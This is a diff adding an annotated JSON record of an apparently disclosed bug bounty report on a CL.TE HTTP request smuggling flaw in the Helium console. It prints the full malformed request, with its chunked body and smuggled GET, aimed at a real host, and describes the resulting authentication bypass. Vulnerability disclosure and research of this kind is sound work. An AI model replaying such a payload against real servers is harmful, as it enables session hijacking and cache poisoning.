@@ -1,0 +1,38 @@
+{
+    "reported_to": "Helium",
+    "reported_by": "dracomalfoy ",
+    "title": "HTTP request Smuggling",
+    "content": "\nWhen malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to \"smuggle\" a request to one device without the other device being aware of it.\nconsole.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.\nProducts affected:\nHelium console Website. : console.helium.com\nSteps To Reproduce:\nRun the burp suite turbo intruder on the following request\nCode 858 Bytes\n1\n2POST /api/sessions HTTP/1.1\n3Host: console.helium.com\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\n5Accept: application/json, text/plain, */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Referer: https://console.helium.com/login\n9Content-Type: application/json\n10Content-Length: 109\n11DNT: 1\n12Connection: close\n13Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9\n14Transfer-Encoding: chunked\n15\n1639\n17{\"session\":{\"email\":\"fdsfsd@fgd.jk\",\"password\":\"sdfsdf\"}}\n1800\n19\n20GET / HTTP/1.1\n21Host: www.helium.com\n22foo: x\n23\n24\nScript for tubro Intruder is attached. Word list can be any list containing any characters.\nObserve 200 Ok response for the /api/sessions post request which is supposed to give 401 Unauthorized {\"errors\":{\"error\":[\"The email address or password you entered is not valid\"]}} Please refer the attached screenshot ( Smuggle Request1.png ) which contain the expected response.\nThis successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A recoding is attached as well.\nAny suggestions or improvement in reports are welcome\nImpact\nIt is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation and cache poisoning can be the impact of this vulnerability as well. Self-Xss can be escalated to XSS. It can be chained with other vulnerabilities to raise their severity.\nAs unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.\nFor more information about the vulnerability please refer :\nhttps://cwe.mitre.org/data/definitions/444.html ;\nhttps://capec.mitre.org/data/definitions/33.html\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "HTTP Request Smuggling"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1593682980,
+    "report_url": "https://hackerone.com/reports/867952",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Run the burp suite turbo intruder on the provided HTTP request with chunked encoding and smuggled GET request"
+        ],
+        [
+            2,
+            "Observe the 200 OK response for the /api/sessions POST request which should normally return 401 Unauthorized"
+        ]
+    ],
+    "vuln_description": "The vulnerability is an HTTP request smuggling attack (CL.TE variant) where malformed requests are interpreted differently by front-end (Content-Length) and back-end (Transfer-Encoding) servers, allowing request smuggling. This can lead to session hijacking, privilege escalation, cache poisoning, and potential XSS escalation.",
+    "reason": "While the vulnerability involves understanding HTTP protocol inconsistencies between front-end and back-end servers, the attack follows a well-documented pattern (CL.TE smuggling) and doesn't require complex application state manipulation or novel logic. The main complexity comes from crafting the malformed request correctly.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
